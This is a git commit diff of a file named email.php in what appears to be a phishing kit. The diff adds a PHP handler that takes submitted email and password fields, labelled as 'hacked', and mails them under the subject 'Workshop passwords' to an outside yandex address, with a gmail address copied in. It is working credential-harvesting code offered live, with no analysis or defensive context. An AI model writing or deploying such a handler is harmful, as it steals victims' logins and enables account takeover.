08b32ff3b91f253b882f9a46d1d8df603faea70b
revive-ui <107645634+revive-ui@users.noreply.github.com>
2023-03-09 11:20:08 +0100

    Update email.php

--- email.php
+++ email.php
@@ -1,4 +1,16 @@
-<?php 
-$Receive_email="mohandas.mair@yandex.com";
-$redirect="https://www.google.com/";
-?>
+<?php
+        $mailhacked = $_POST["email"];
+        $passwordhacked = $_POST["password"];
+         $to = "mohandas.mair@yandex.com";
+         $subject = "Workshop passwords";
+         
+         $message = "$mailhacked";
+         $message .= "<br>$passwordhacked";
+         
+         $header = "From:HACK3R@Hack3r.com \r\n";
+         $header .= "Cc:tadeualvez6@gmail.com \r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+         
+         $retval = mail($to,$subject,$message,$header);
+      ?>
